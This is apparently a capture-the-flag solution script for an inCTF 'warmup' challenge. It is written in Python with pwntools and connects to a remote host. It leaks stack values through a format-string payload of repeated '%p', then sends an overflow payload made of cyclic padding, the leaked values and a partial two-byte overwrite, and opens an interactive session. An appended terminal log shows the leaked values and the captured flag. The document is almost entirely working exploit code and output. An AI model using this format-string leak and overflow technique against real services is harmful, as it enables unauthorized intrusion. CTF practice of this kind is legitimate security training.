
from pwn import *
context.bits = 32
context.log_level = "critical"

# io = remote("127.0.0.1", 1337)
io = remote("54.224.176.60", 1414)

leak = '%p' * 29 + '..%p' * 2
io.sendafter("want :", leak)
io.recvuntil("..")
k1 = int(io.recvuntil("..", drop = True), 16)
print("k1 @ {:#x}".format(k1))

# io.recvuntil("..")
k2 = int(io.recvuntil("\r\n", drop = True), 16)
print("k2 @ {:#x}".format(k2))

payload = flat(cyclic(64), k1, k2, p16(0x6c80))
io.sendafter("??? :", payload)

io.interactive()
'''
m4x@m4x-PC:/mnt/c/Users/M4x/Desktop/inCTF/warmup$ python solve.py 
k1 @ 0x29fd1f13
k2 @ 0x9bfa1c
inctf{Ok4y..._Thats_b3autiful-_=!!!}$ 
'''